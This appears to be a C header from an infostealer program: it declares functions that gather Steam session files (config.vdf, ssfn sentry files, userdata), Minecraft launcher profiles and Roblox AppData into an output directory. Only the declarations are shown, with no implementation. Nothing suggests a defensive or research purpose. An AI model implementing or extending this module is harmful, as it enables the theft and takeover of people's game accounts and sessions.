#ifndef GAMING_H
#define GAMING_H

#include <stddef.h>

/* Collect Steam session data (config.vdf, ssfn*, userdata/) */
int gaming_collect_steam(const char *output_dir);

/* Collect Minecraft data (.minecraft, launcher_profiles.json) */
int gaming_collect_minecraft(const char *output_dir);

/* Collect Roblox data (AppData/Roblox) */
int gaming_collect_roblox(const char *output_dir);

/* Collect all gaming data */
int gaming_collect_all(const char *output_dir);

#endif
